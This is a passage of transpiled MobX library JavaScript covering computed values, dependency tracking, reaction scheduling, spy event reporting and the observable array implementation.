    ComputedValue.prototype.trackAndCompute = function () {
        if (isSpyEnabled()) {
            spyReport({
                object: this.scope,
                type: "compute",
                fn: this.derivation
            });
        }
        var oldValue = this.value;
        var newValue = this.value = this.computeValue(true);
        return isCaughtException(newValue) || valueDidChange(this.compareStructural, newValue, oldValue);
    };
    ComputedValue.prototype.computeValue = function (track) {
        this.isComputing = true;
        globalState.computationDepth++;
        var res;
        if (track) {
            res = trackDerivedFunction(this, this.derivation, this.scope);
        } else {
            try {
                res = this.derivation.call(this.scope);
            } catch (e) {
                res = new CaughtException(e);
            }
        }
        globalState.computationDepth--;
        this.isComputing = false;
        return res;
    };
    ;
    ComputedValue.prototype.observe = function (listener, fireImmediately) {
        var _this = this;
        var firstTime = true;
        var prevValue = undefined;
        return autorun(function () {
            var newValue = _this.get();
            if (!firstTime || fireImmediately) {
                var prevU = untrackedStart();
                listener({
                    type: "update",
                    object: _this,
                    newValue: newValue,
                    oldValue: prevValue
                });
                untrackedEnd(prevU);
            }
            firstTime = false;
            prevValue = newValue;
        });
    };
    ComputedValue.prototype.toJSON = function () {
        return this.get();
    };
    ComputedValue.prototype.toString = function () {
        return this.name + "[" + this.derivation.toString() + "]";
    };
    ComputedValue.prototype.valueOf = function () {
        return toPrimitive(this.get());
    };
    ;
    ComputedValue.prototype.whyRun = function () {
        var isTracking = Boolean(globalState.trackingDerivation);
        var observing = unique(this.isComputing ? this.newObserving : this.observing).map(function (dep) {
            return dep.name;
        });
        var observers = unique(getObservers(this).map(function (dep) {
            return dep.name;
        }));
        return "\nWhyRun? computation '" + this.name + "':\n * Running because: " + (isTracking ? "[active] the value of this computation is needed by a reaction" : this.isComputing ? "[get] The value of this computed was requested outside a reaction" : "[idle] not running at the moment") + "\n" + (this.dependenciesState === IDerivationState.NOT_TRACKING ? getMessage("m032") : " * This computation will re-run if any of the following observables changes:\n    " + joinStrings(observing) + "\n    " + (this.isComputing && isTracking ? " (... or any observable accessed during the remainder of the current run)" : "") + "\n\t" + getMessage("m038") + "\n\n  * If the outcome of this computation changes, the following observers will be re-run:\n    " + joinStrings(observers) + "\n");
    };
    return ComputedValue;
}();
ComputedValue.prototype[primitiveSymbol()] = ComputedValue.prototype.valueOf;
var isComputedValue = createInstanceofPredicate("ComputedValue", ComputedValue);
var IDerivationState;
(function (IDerivationState) {
    IDerivationState[IDerivationState["NOT_TRACKING"] = -1] = "NOT_TRACKING";
    IDerivationState[IDerivationState["UP_TO_DATE"] = 0] = "UP_TO_DATE";
    IDerivationState[IDerivationState["POSSIBLY_STALE"] = 1] = "POSSIBLY_STALE";
    IDerivationState[IDerivationState["STALE"] = 2] = "STALE";
})(IDerivationState || (IDerivationState = {}));
exports.IDerivationState = IDerivationState;
var CaughtException = function () {
    function CaughtException(cause) {
        this.cause = cause;
    }
    return CaughtException;
}();
function isCaughtException(e) {
    return e instanceof CaughtException;
}
function shouldCompute(derivation) {
    switch (derivation.dependenciesState) {
        case IDerivationState.UP_TO_DATE:
            return false;
        case IDerivationState.NOT_TRACKING:
        case IDerivationState.STALE:
            return true;
        case IDerivationState.POSSIBLY_STALE:
            {
                var prevUntracked = untrackedStart();
                var obs = derivation.observing,
                    l = obs.length;
                for (var i = 0; i < l; i++) {
                    var obj = obs[i];
                    if (isComputedValue(obj)) {
                        try {
                            obj.get();
                        } catch (e) {
                            untrackedEnd(prevUntracked);
                            return true;
                        }
                        if (derivation.dependenciesState === IDerivationState.STALE) {
                            untrackedEnd(prevUntracked);
                            return true;
                        }
                    }
                }
                changeDependenciesStateTo0(derivation);
                untrackedEnd(prevUntracked);
                return false;
            }
    }
}
function isComputingDerivation() {
    return globalState.trackingDerivation !== null;
}
function checkIfStateModificationsAreAllowed(atom) {
    var hasObservers = atom.observers.length > 0;
    if (globalState.computationDepth > 0 && hasObservers) fail(getMessage("m031") + atom.name);
    if (!globalState.allowStateChanges && hasObservers) fail(getMessage(globalState.strictMode ? "m030a" : "m030b") + atom.name);
}
function trackDerivedFunction(derivation, f, context) {
    changeDependenciesStateTo0(derivation);
    derivation.newObserving = new Array(derivation.observing.length + 100);
    derivation.unboundDepsCount = 0;
    derivation.runId = ++globalState.runId;
    var prevTracking = globalState.trackingDerivation;
    globalState.trackingDerivation = derivation;
    var result;
    try {
        result = f.call(context);
    } catch (e) {
        result = new CaughtException(e);
    }
    globalState.trackingDerivation = prevTracking;
    bindDependencies(derivation);
    return result;
}
function bindDependencies(derivation) {
    var prevObserving = derivation.observing;
    var observing = derivation.observing = derivation.newObserving;
    derivation.newObserving = null;
    var i0 = 0,
        l = derivation.unboundDepsCount;
    for (var i = 0; i < l; i++) {
        var dep = observing[i];
        if (dep.diffValue === 0) {
            dep.diffValue = 1;
            if (i0 !== i) observing[i0] = dep;
            i0++;
        }
    }
    observing.length = i0;
    l = prevObserving.length;
    while (l--) {
        var dep = prevObserving[l];
        if (dep.diffValue === 0) {
            removeObserver(dep, derivation);
        }
        dep.diffValue = 0;
    }
    while (i0--) {
        var dep = observing[i0];
        if (dep.diffValue === 1) {
            dep.diffValue = 0;
            addObserver(dep, derivation);
        }
    }
}
function clearObserving(derivation) {
    var obs = derivation.observing;
    var i = obs.length;
    while (i--) {
        removeObserver(obs[i], derivation);
    }derivation.dependenciesState = IDerivationState.NOT_TRACKING;
    obs.length = 0;
}
function untracked(action) {
    var prev = untrackedStart();
    var res = action();
    untrackedEnd(prev);
    return res;
}
exports.untracked = untracked;
function untrackedStart() {
    var prev = globalState.trackingDerivation;
    globalState.trackingDerivation = null;
    return prev;
}
function untrackedEnd(prev) {
    globalState.trackingDerivation = prev;
}
function changeDependenciesStateTo0(derivation) {
    if (derivation.dependenciesState === IDerivationState.UP_TO_DATE) return;
    derivation.dependenciesState = IDerivationState.UP_TO_DATE;
    var obs = derivation.observing;
    var i = obs.length;
    while (i--) {
        obs[i].lowestObserverState = IDerivationState.UP_TO_DATE;
    }
}
var persistentKeys = ["mobxGuid", "resetId", "spyListeners", "strictMode", "runId"];
var MobXGlobals = function () {
    function MobXGlobals() {
        this.version = 5;
        this.trackingDerivation = null;
        this.computationDepth = 0;
        this.runId = 0;
        this.mobxGuid = 0;
        this.inBatch = 0;
        this.pendingUnobservations = [];
        this.pendingReactions = [];
        this.isRunningReactions = false;
        this.allowStateChanges = true;
        this.strictMode = false;
        this.resetId = 0;
        this.spyListeners = [];
        this.globalReactionErrorHandlers = [];
    }
    return MobXGlobals;
}();
var globalState = new MobXGlobals();
function shareGlobalState() {
    var global = getGlobal();
    var ownState = globalState;
    if (global.__mobservableTrackingStack || global.__mobservableViewStack) throw new Error("[mobx] An incompatible version of mobservable is already loaded.");
    if (global.__mobxGlobal && global.__mobxGlobal.version !== ownState.version) throw new Error("[mobx] An incompatible version of mobx is already loaded.");
    if (global.__mobxGlobal) globalState = global.__mobxGlobal;else global.__mobxGlobal = ownState;
}
function getGlobalState() {
    return globalState;
}
function registerGlobals() {}
function resetGlobalState() {
    globalState.resetId++;
    var defaultGlobals = new MobXGlobals();
    for (var key in defaultGlobals) {
        if (persistentKeys.indexOf(key) === -1) globalState[key] = defaultGlobals[key];
    }globalState.allowStateChanges = !globalState.strictMode;
}
function hasObservers(observable) {
    return observable.observers && observable.observers.length > 0;
}
function getObservers(observable) {
    return observable.observers;
}
function invariantObservers(observable) {
    var list = observable.observers;
    var map = observable.observersIndexes;
    var l = list.length;
    for (var i = 0; i < l; i++) {
        var id = list[i].__mapid;
        if (i) {
            invariant(map[id] === i, "INTERNAL ERROR maps derivation.__mapid to index in list");
        } else {
            invariant(!(id in map), "INTERNAL ERROR observer on index 0 shouldnt be held in map.");
        }
    }
    invariant(list.length === 0 || Object.keys(map).length === list.length - 1, "INTERNAL ERROR there is no junk in map");
}
function addObserver(observable, node) {
    var l = observable.observers.length;
    if (l) {
        observable.observersIndexes[node.__mapid] = l;
    }
    observable.observers[l] = node;
    if (observable.lowestObserverState > node.dependenciesState) observable.lowestObserverState = node.dependenciesState;
}
function removeObserver(observable, node) {
    if (observable.observers.length === 1) {
        observable.observers.length = 0;
        queueForUnobservation(observable);
    } else {
        var list = observable.observers;
        var map_1 = observable.observersIndexes;
        var filler = list.pop();
        if (filler !== node) {
            var index = map_1[node.__mapid] || 0;
            if (index) {
                map_1[filler.__mapid] = index;
            } else {
                delete map_1[filler.__mapid];
            }
            list[index] = filler;
        }
        delete map_1[node.__mapid];
    }
}
function queueForUnobservation(observable) {
    if (!observable.isPendingUnobservation) {
        observable.isPendingUnobservation = true;
        globalState.pendingUnobservations.push(observable);
    }
}
function startBatch() {
    globalState.inBatch++;
}
function endBatch() {
    if (--globalState.inBatch === 0) {
        runReactions();
        var list = globalState.pendingUnobservations;
        for (var i = 0; i < list.length; i++) {
            var observable_1 = list[i];
            observable_1.isPendingUnobservation = false;
            if (observable_1.observers.length === 0) {
                observable_1.onBecomeUnobserved();
            }
        }
        globalState.pendingUnobservations = [];
    }
}
function reportObserved(observable) {
    var derivation = globalState.trackingDerivation;
    if (derivation !== null) {
        if (derivation.runId !== observable.lastAccessedBy) {
            observable.lastAccessedBy = derivation.runId;
            derivation.newObserving[derivation.unboundDepsCount++] = observable;
        }
    } else if (observable.observers.length === 0) {
        queueForUnobservation(observable);
    }
}
function invariantLOS(observable, msg) {
    var min = getObservers(observable).reduce(function (a, b) {
        return Math.min(a, b.dependenciesState);
    }, 2);
    if (min >= observable.lowestObserverState) return;
    throw new Error("lowestObserverState is wrong for " + msg + " because " + min + " < " + observable.lowestObserverState);
}
function propagateChanged(observable) {
    if (observable.lowestObserverState === IDerivationState.STALE) return;
    observable.lowestObserverState = IDerivationState.STALE;
    var observers = observable.observers;
    var i = observers.length;
    while (i--) {
        var d = observers[i];
        if (d.dependenciesState === IDerivationState.UP_TO_DATE) d.onBecomeStale();
        d.dependenciesState = IDerivationState.STALE;
    }
}
function propagateChangeConfirmed(observable) {
    if (observable.lowestObserverState === IDerivationState.STALE) return;
    observable.lowestObserverState = IDerivationState.STALE;
    var observers = observable.observers;
    var i = observers.length;
    while (i--) {
        var d = observers[i];
        if (d.dependenciesState === IDerivationState.POSSIBLY_STALE) d.dependenciesState = IDerivationState.STALE;else if (d.dependenciesState === IDerivationState.UP_TO_DATE) observable.lowestObserverState = IDerivationState.UP_TO_DATE;
    }
}
function propagateMaybeChanged(observable) {
    if (observable.lowestObserverState !== IDerivationState.UP_TO_DATE) return;
    observable.lowestObserverState = IDerivationState.POSSIBLY_STALE;
    var observers = observable.observers;
    var i = observers.length;
    while (i--) {
        var d = observers[i];
        if (d.dependenciesState === IDerivationState.UP_TO_DATE) {
            d.dependenciesState = IDerivationState.POSSIBLY_STALE;
            d.onBecomeStale();
        }
    }
}
var Reaction = function () {
    function Reaction(name, onInvalidate) {
        if (name === void 0) {
            name = "Reaction@" + getNextId();
        }
        this.name = name;
        this.onInvalidate = onInvalidate;
        this.observing = [];
        this.newObserving = [];
        this.dependenciesState = IDerivationState.NOT_TRACKING;
        this.diffValue = 0;
        this.runId = 0;
        this.unboundDepsCount = 0;
        this.__mapid = "#" + getNextId();
        this.isDisposed = false;
        this._isScheduled = false;
        this._isTrackPending = false;
        this._isRunning = false;
    }
    Reaction.prototype.onBecomeStale = function () {
        this.schedule();
    };
    Reaction.prototype.schedule = function () {
        if (!this._isScheduled) {
            this._isScheduled = true;
            globalState.pendingReactions.push(this);
            runReactions();
        }
    };
    Reaction.prototype.isScheduled = function () {
        return this._isScheduled;
    };
    Reaction.prototype.runReaction = function () {
        if (!this.isDisposed) {
            startBatch();
            this._isScheduled = false;
            if (shouldCompute(this)) {
                this._isTrackPending = true;
                this.onInvalidate();
                if (this._isTrackPending && isSpyEnabled()) {
                    spyReport({
                        object: this,
                        type: "scheduled-reaction"
                    });
                }
            }
            endBatch();
        }
    };
    Reaction.prototype.track = function (fn) {
        startBatch();
        var notify = isSpyEnabled();
        var startTime;
        if (notify) {
            startTime = Date.now();
            spyReportStart({
                object: this,
                type: "reaction",
                fn: fn
            });
        }
        this._isRunning = true;
        var result = trackDerivedFunction(this, fn, undefined);
        this._isRunning = false;
        this._isTrackPending = false;
        if (this.isDisposed) {
            clearObserving(this);
        }
        if (isCaughtException(result)) this.reportExceptionInDerivation(result.cause);
        if (notify) {
            spyReportEnd({
                time: Date.now() - startTime
            });
        }
        endBatch();
    };
    Reaction.prototype.reportExceptionInDerivation = function (error) {
        var _this = this;
        if (this.errorHandler) {
            this.errorHandler(error, this);
            return;
        }
        var message = "[mobx] Encountered an uncaught exception that was thrown by a reaction or observer component, in: '" + this;
        var messageToUser = getMessage("m037");
        console.error(message || messageToUser, error);
        if (isSpyEnabled()) {
            spyReport({
                type: "error",
                message: message,
                error: error,
                object: this
            });
        }
        globalState.globalReactionErrorHandlers.forEach(function (f) {
            return f(error, _this);
        });
    };
    Reaction.prototype.dispose = function () {
        if (!this.isDisposed) {
            this.isDisposed = true;
            if (!this._isRunning) {
                startBatch();
                clearObserving(this);
                endBatch();
            }
        }
    };
    Reaction.prototype.getDisposer = function () {
        var r = this.dispose.bind(this);
        r.$mobx = this;
        r.onError = registerErrorHandler;
        return r;
    };
    Reaction.prototype.toString = function () {
        return "Reaction[" + this.name + "]";
    };
    Reaction.prototype.whyRun = function () {
        var observing = unique(this._isRunning ? this.newObserving : this.observing).map(function (dep) {
            return dep.name;
        });
        return "\nWhyRun? reaction '" + this.name + "':\n * Status: [" + (this.isDisposed ? "stopped" : this._isRunning ? "running" : this.isScheduled() ? "scheduled" : "idle") + "]\n * This reaction will re-run if any of the following observables changes:\n    " + joinStrings(observing) + "\n    " + (this._isRunning ? " (... or any observable accessed during the remainder of the current run)" : "") + "\n\t" + getMessage("m038") + "\n";
    };
    return Reaction;
}();
exports.Reaction = Reaction;
function registerErrorHandler(handler) {
    invariant(this && this.$mobx && isReaction(this.$mobx), "Invalid `this`");
    invariant(!this.$mobx.errorHandler, "Only one onErrorHandler can be registered");
    this.$mobx.errorHandler = handler;
}
function onReactionError(handler) {
    globalState.globalReactionErrorHandlers.push(handler);
    return function () {
        var idx = globalState.globalReactionErrorHandlers.indexOf(handler);
        if (idx >= 0) globalState.globalReactionErrorHandlers.splice(idx, 1);
    };
}
var MAX_REACTION_ITERATIONS = 100;
var reactionScheduler = function reactionScheduler(f) {
    return f();
};
function runReactions() {
    if (globalState.inBatch > 0 || globalState.isRunningReactions) return;
    reactionScheduler(runReactionsHelper);
}
function runReactionsHelper() {
    globalState.isRunningReactions = true;
    var allReactions = globalState.pendingReactions;
    var iterations = 0;
    while (allReactions.length > 0) {
        if (++iterations === MAX_REACTION_ITERATIONS) {
            console.error("Reaction doesn't converge to a stable state after " + MAX_REACTION_ITERATIONS + " iterations." + (" Probably there is a cycle in the reactive function: " + allReactions[0]));
            allReactions.splice(0);
        }
        var remainingReactions = allReactions.splice(0);
        for (var i = 0, l = remainingReactions.length; i < l; i++) {
            remainingReactions[i].runReaction();
        }
    }
    globalState.isRunningReactions = false;
}
var isReaction = createInstanceofPredicate("Reaction", Reaction);
function setReactionScheduler(fn) {
    var baseScheduler = reactionScheduler;
    reactionScheduler = function reactionScheduler(f) {
        return fn(function () {
            return baseScheduler(f);
        });
    };
}
function isSpyEnabled() {
    return !!globalState.spyListeners.length;
}
function spyReport(event) {
    if (!globalState.spyListeners.length) return;
    var listeners = globalState.spyListeners;
    for (var i = 0, l = listeners.length; i < l; i++) {
        listeners[i](event);
    }
}
function spyReportStart(event) {
    var change = objectAssign({}, event, { spyReportStart: true });
    spyReport(change);
}
var END_EVENT = { spyReportEnd: true };
function spyReportEnd(change) {
    if (change) spyReport(objectAssign({}, change, END_EVENT));else spyReport(END_EVENT);
}
function spy(listener) {
    globalState.spyListeners.push(listener);
    return once(function () {
        var idx = globalState.spyListeners.indexOf(listener);
        if (idx !== -1) globalState.spyListeners.splice(idx, 1);
    });
}
exports.spy = spy;
function hasInterceptors(interceptable) {
    return interceptable.interceptors && interceptable.interceptors.length > 0;
}
function registerInterceptor(interceptable, handler) {
    var interceptors = interceptable.interceptors || (interceptable.interceptors = []);
    interceptors.push(handler);
    return once(function () {
        var idx = interceptors.indexOf(handler);
        if (idx !== -1) interceptors.splice(idx, 1);
    });
}
function interceptChange(interceptable, change) {
    var prevU = untrackedStart();
    try {
        var interceptors = interceptable.interceptors;
        if (interceptors) for (var i = 0, l = interceptors.length; i < l; i++) {
            change = interceptors[i](change);
            invariant(!change || change.type, "Intercept handlers should return nothing or a change object");
            if (!change) break;
        }
        return change;
    } finally {
        untrackedEnd(prevU);
    }
}
function hasListeners(listenable) {
    return listenable.changeListeners && listenable.changeListeners.length > 0;
}
function registerListener(listenable, handler) {
    var listeners = listenable.changeListeners || (listenable.changeListeners = []);
    listeners.push(handler);
    return once(function () {
        var idx = listeners.indexOf(handler);
        if (idx !== -1) listeners.splice(idx, 1);
    });
}
function notifyListeners(listenable, change) {
    var prevU = untrackedStart();
    var listeners = listenable.changeListeners;
    if (!listeners) return;
    listeners = listeners.slice();
    for (var i = 0, l = listeners.length; i < l; i++) {
        listeners[i](change);
    }
    untrackedEnd(prevU);
}
function asReference(value) {
    deprecated("asReference is deprecated, use observable.ref instead");
    return observable.ref(value);
}
exports.asReference = asReference;
function asStructure(value) {
    deprecated("asStructure is deprecated. Use observable.struct, computed.struct or reaction options instead.");
    return observable.struct(value);
}
exports.asStructure = asStructure;
function asFlat(value) {
    deprecated("asFlat is deprecated, use observable.shallow instead");
    return observable.shallow(value);
}
exports.asFlat = asFlat;
function asMap(data) {
    deprecated("asMap is deprecated, use observable.map or observable.shallowMap instead");
    return observable.map(data || {});
}
exports.asMap = asMap;
function isModifierDescriptor(thing) {
    return (typeof thing === "undefined" ? "undefined" : _typeof(thing)) === "object" && thing !== null && thing.isMobxModifierDescriptor === true;
}
exports.isModifierDescriptor = isModifierDescriptor;
function createModifierDescriptor(enhancer, initialValue) {
    invariant(!isModifierDescriptor(initialValue), "Modifiers cannot be nested");
    return {
        isMobxModifierDescriptor: true,
        initialValue: initialValue,
        enhancer: enhancer
    };
}
function deepEnhancer(v, _, name) {
    if (isModifierDescriptor(v)) fail("You tried to assign a modifier wrapped value to a collection, please define modifiers when creating the collection, not when modifying it");
    if (isObservable(v)) return v;
    if (Array.isArray(v)) return observable.array(v, name);
    if (isPlainObject(v)) return observable.object(v, name);
    if (isES6Map(v)) return observable.map(v, name);
    return v;
}
function shallowEnhancer(v, _, name) {
    if (isModifierDescriptor(v)) fail("You tried to assign a modifier wrapped value to a collection, please define modifiers when creating the collection, not when modifying it");
    if (v === undefined || v === null) return v;
    if (isObservableObject(v) || isObservableArray(v) || isObservableMap(v)) return v;
    if (Array.isArray(v)) return observable.shallowArray(v, name);
    if (isPlainObject(v)) return observable.shallowObject(v, name);
    if (isES6Map(v)) return observable.shallowMap(v, name);
    return fail("The shallow modifier / decorator can only used in combination with arrays, objects and maps");
}
function referenceEnhancer(newValue) {
    return newValue;
}
function deepStructEnhancer(v, oldValue, name) {
    if (deepEqual(v, oldValue)) return oldValue;
    if (isObservable(v)) return v;
    if (Array.isArray(v)) return new ObservableArray(v, deepStructEnhancer, name);
    if (isES6Map(v)) return new ObservableMap(v, deepStructEnhancer, name);
    if (isPlainObject(v)) {
        var res = {};
        asObservableObject(res, name);
        extendObservableHelper(res, deepStructEnhancer, [v]);
        return res;
    }
    return v;
}
function refStructEnhancer(v, oldValue, name) {
    if (deepEqual(v, oldValue)) return oldValue;
    return v;
}
var MAX_SPLICE_SIZE = 10000;
var safariPrototypeSetterInheritanceBug = function () {
    var v = false;
    var p = {};
    Object.defineProperty(p, "0", { set: function set() {
            v = true;
        } });
    Object.create(p)["0"] = 1;
    return v === false;
}();
var OBSERVABLE_ARRAY_BUFFER_SIZE = 0;
var StubArray = function () {
    function StubArray() {}
    return StubArray;
}();
StubArray.prototype = [];
var ObservableArrayAdministration = function () {
    function ObservableArrayAdministration(name, enhancer, array, owned) {
        this.array = array;
        this.owned = owned;
        this.lastKnownLength = 0;
        this.interceptors = null;
        this.changeListeners = null;
        this.atom = new BaseAtom(name || "ObservableArray@" + getNextId());
        this.enhancer = function (newV, oldV) {
            return enhancer(newV, oldV, name + "[..]");
        };
    }
    ObservableArrayAdministration.prototype.intercept = function (handler) {
        return registerInterceptor(this, handler);
    };
    ObservableArrayAdministration.prototype.observe = function (listener, fireImmediately) {
        if (fireImmediately === void 0) {
            fireImmediately = false;
        }
        if (fireImmediately) {
            listener({
                object: this.array,
                type: "splice",
                index: 0,
                added: this.values.slice(),
                addedCount: this.values.length,
                removed: [],
                removedCount: 0
            });
        }
        return registerListener(this, listener);
    };
    ObservableArrayAdministration.prototype.getArrayLength = function () {
        this.atom.reportObserved();
        return this.values.length;
    };
    ObservableArrayAdministration.prototype.setArrayLength = function (newLength) {
        if (typeof newLength !== "number" || newLength < 0) throw new Error("[mobx.array] Out of range: " + newLength);
        var currentLength = this.values.length;
        if (newLength === currentLength) return;else if (newLength > currentLength) {
            var newItems = new Array(newLength - currentLength);
            for (var i = 0; i < newLength - currentLength; i++) {
                newItems[i] = undefined;
            }this.spliceWithArray(currentLength, 0, newItems);
        } else this.spliceWithArray(newLength, currentLength - newLength);
    };
    ObservableArrayAdministration.prototype.updateArrayLength = function (oldLength, delta) {
        if (oldLength !== this.lastKnownLength) throw new Error("[mobx] Modification exception: the internal structure of an observable array was changed. Did you use peek() to change it?");
        this.lastKnownLength += delta;
        if (delta > 0 && oldLength + delta + 1 > OBSERVABLE_ARRAY_BUFFER_SIZE) reserveArrayBuffer(oldLength + delta + 1);
    };
    ObservableArrayAdministration.prototype.spliceWithArray = function (index, deleteCount, newItems) {
        var _this = this;
        checkIfStateModificationsAreAllowed(this.atom);
        var length = this.values.length;
        if (index === undefined) index = 0;else if (index > length) index = length;else if (index < 0) index = Math.max(0, length + index);
        if (arguments.length === 1) deleteCount = length - index;else if (deleteCount === undefined || deleteCount === null) deleteCount = 0;else deleteCount = Math.max(0, Math.min(deleteCount, length - index));
        if (newItems === undefined) newItems = [];
        if (hasInterceptors(this)) {
            var change = interceptChange(this, {
                object: this.array,
                type: "splice",
                index: index,
                removedCount: deleteCount,
                added: newItems
            });
            if (!change) return EMPTY_ARRAY;
            deleteCount = change.removedCount;
            newItems = change.added;
        }
        newItems = newItems.map(function (v) {
            return _this.enhancer(v, undefined);
        });
        var lengthDelta = newItems.length - deleteCount;
        this.updateArrayLength(length, lengthDelta);
        var res = this.spliceItemsIntoValues(index, deleteCount, newItems);
        if (deleteCount !== 0 || newItems.length !== 0) this.notifyArraySplice(index, newItems, res);
        return res;
    };
    ObservableArrayAdministration.prototype.spliceItemsIntoValues = function (index, deleteCount, newItems) {
        if (newItems.length < MAX_SPLICE_SIZE) {
            return (_a = this.values).splice.apply(_a, [index, deleteCount].concat(newItems));
        } else {
            var res = this.values.slice(index, index + deleteCount);
            this.values = this.values.slice(0, index).concat(newItems, this.values.slice(index + deleteCount));
            return res;
        }
        var _a;
    };
    ObservableArrayAdministration.prototype.notifyArrayChildUpdate = function (index, newValue, oldValue) {
        var notifySpy = !this.owned && isSpyEnabled();
        var notify = hasListeners(this);
        var change = notify || notifySpy ? {
            object: this.array,
            type: "update",
            index: index, newValue: newValue, oldValue: oldValue
        } : null;
        if (notifySpy) spyReportStart(change);
        this.atom.reportChanged();
        if (notify) notifyListeners(this, change);
        if (notifySpy) spyReportEnd();
    };
    ObservableArrayAdministration.prototype.notifyArraySplice = function (index, added, removed) {
        var notifySpy = !this.owned && isSpyEnabled();
        var notify = hasListeners(this);
        var change = notify || notifySpy ? {
            object: this.array,
            type: "splice",
            index: index, removed: removed, added: added,
            removedCount: removed.length,
            addedCount: added.length
        } : null;
        if (notifySpy) spyReportStart(change);
        this.atom.reportChanged();
        if (notify) notifyListeners(this, change);
        if (notifySpy) spyReportEnd();
    };
    return ObservableArrayAdministration;
}();
var ObservableArray = function (_super) {
    __extends(ObservableArray, _super);
    function ObservableArray(initialValues, enhancer, name, owned) {
        if (name === void 0) {
            name = "ObservableArray@" + getNextId();
        }
        if (owned === void 0) {
            owned = false;
        }
        var _this = _super.call(this) || this;
        var adm = new ObservableArrayAdministration(name, enhancer, _this, owned);
        addHiddenFinalProp(_this, "$mobx", adm);
        if (initialValues && initialValues.length) {
            adm.updateArrayLength(0, initialValues.length);
            adm.values = initialValues.map(function (v) {
                return enhancer(v, undefined, name + "[..]");
            });
            adm.notifyArraySplice(0, adm.values.slice(), EMPTY_ARRAY);
        } else {
            adm.values = [];
        }
        if (safariPrototypeSetterInheritanceBug) {
            Object.defineProperty(adm.array, "0", ENTRY_0);
        }
        return _this;
    }
    ObservableArray.prototype.intercept = function (handler) {
        return this.$mobx.intercept(handler);
    };
    ObservableArray.prototype.observe = function (listener, fireImmediately) {
        if (fireImmediately === void 0) {
            fireImmediately = false;
        }
        return this.$mobx.observe(listener, fireImmediately);
    };
    ObservableArray.prototype.clear = function () {
        return this.splice(0);
    };
    ObservableArray.prototype.concat = function () {
        var arrays = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            arrays[_i] = arguments[_i];
        }
        this.$mobx.atom.reportObserved();
        return Array.prototype.concat.apply(this.peek(), arrays.map(function (a) {
            return isObservableArray(a) ? a.peek() : a;
        }));
    };
    ObservableArray.prototype.replace = function (newItems) {
        return this.$mobx.spliceWithArray(0, this.$mobx.values.length, newItems);
    };
    ObservableArray.prototype.toJS = function () {
        return this.slice();
    };
    ObservableArray.prototype.toJSON = function () {
        return this.toJS();
    };
    ObservableArray.prototype.peek = function () {
        return this.$mobx.values;
    };
    ObservableArray.prototype.find = function (predicate, thisArg, fromIndex) {
        if (fromIndex === void 0) {
            fromIndex = 0;
        }
        this.$mobx.atom.reportObserved();
        var items = this.$mobx.values,
            l = items.length;
        for (var i = fromIndex; i < l; i++) {
            if (predicate.call(thisArg, items[i], i, this)) return items[i];
        }return undefined;
    };
    ObservableArray.prototype.splice = function (index, deleteCount) {
        var newItems = [];
        for (var _i = 2; _i < arguments.length; _i++) {
            newItems[_i - 2] = arguments[_i];
        }
        switch (arguments.length) {
            case 0:
                return [];
            case 1:
                return this.$mobx.spliceWithArray(index);
            case 2:
                return this.$mobx.spliceWithArray(index, deleteCount);
        }
        return this.$mobx.spliceWithArray(index, deleteCount, newItems);
    };
    ObservableArray.prototype.spliceWithArray = function (index, deleteCount, newItems) {
        return this.$mobx.spliceWithArray(index, deleteCount, newItems);
    };
    ObservableArray.prototype.push = function () {
        var items = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            items[_i] = arguments[_i];
        }
        var adm = this.$mobx;
        adm.spliceWithArray(adm.values.length, 0, items);
        return adm.values.length;
    };
    ObservableArray.prototype.pop = function () {
        return this.splice(Math.max(this.$mobx.values.length - 1, 0), 1)[0];
    };
    ObservableArray.prototype.shift = function () {
        return this.splice(0, 1)[0];
    };
    ObservableArray.prototype.unshift = function () {
        var items = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            items[_i] = arguments[_i];
        }
        var adm = this.$mobx;
        adm.spliceWithArray(0, 0, items);
        return adm.values.length;
    };
    ObservableArray.prototype.reverse = function () {
        this.$mobx.atom.reportObserved();
        var clone = this.slice();
        return clone.reverse.apply(clone, arguments);
    };
    ObservableArray.prototype.sort = function (compareFn) {
        this.$mobx.atom.reportObserved();
        var clone = this.slice();
        return clone.sort.apply(clone, arguments);
    };
    ObservableArray.prototype.remove = function (value) {
        var idx = this.$mobx.values.indexOf(value);
        if (idx > -1) {
            this.splice(idx, 1);
            return true;
        }
        return false;
    };
    ObservableArray.prototype.move = function (fromIndex, toIndex) {
        function checkIndex(index) {
            if (index < 0) {
                throw new Error("[mobx.array] Index out of bounds: " + index + " is negative");
            }
            var length = this.$mobx.values.length;
            if (index >= length) {
                throw new Error("[mobx.array] Index out of bounds: " + index + " is not smaller than " + length);
            }
        }
        checkIndex.call(this, fromIndex);
        checkIndex.call(this, toIndex);
        if (fromIndex === toIndex) {
            return;
        }
        var oldItems = this.$mobx.values;
        var newItems;
        if (fromIndex < toIndex) {
            newItems = oldItems.slice(0, fromIndex).concat(oldItems.slice(fromIndex + 1, toIndex + 1), [oldItems[fromIndex]], oldItems.slice(toIndex + 1));
        } else {
            newItems = oldItems.slice(0, toIndex).concat([oldItems[fromIndex]], oldItems.slice(toIndex, fromIndex), oldItems.slice(fromIndex + 1));
        }
        this.replace(newItems);
    };
    ObservableArray.prototype.toString = function () {
        this.$mobx.atom.reportObserved();
        return Array.prototype.toString.apply(this.$mobx.values, arguments);
    };
    ObservableArray.prototype.toLocaleString = function () {
        this.$mobx.atom.reportObserved();
        return Array.prototype.toLocaleString.apply(this.$mobx.values, arguments);
    };
    return ObservableArray;
}(StubArray);
declareIterator(ObservableArray.prototype, function () {
    return arrayAsIterator(this.slice());
});
makeNonEnumerable(ObservableArray.prototype, ["constructor", "intercept", "observe", "clear", "concat", "replace", "toJS", "toJSON", "peek", "find", "splice", "spliceWithArray", "push", "pop", "shift", "unshift", "reverse", "sort", "remove", "move", "toString", "toLocaleString"]);
Object.defineProperty(ObservableArray.prototype, "length", {
    enumerable: false,
    configurable: true,
    get: function get() {
        return this.$mobx.getArrayLength();
    },
    set: function set(newLength) {
        this.$mobx.setArrayLength(newLength);
    }
});
["every", "filter", "forEach", "indexOf", "join", "lastIndexOf", "map", "reduce", "reduceRight", "slice", "some"].forEach(function (funcName) {
    var baseFunc = Array.prototype[funcName];
    invariant(typeof baseFunc === "function", "Base function not defined on Array prototype: '" + funcName + "'");
    addHiddenProp(ObservableArray.prototype, funcName, function () {
        this.$mobx.atom.reportObserved();
        return baseFunc.apply(this.$mobx.values, arguments);
    });
});
var ENTRY_0 = {
    configurable: true,
    enumerable: false,
    set: createArraySetter(0),
    get: createArrayGetter(0)
};
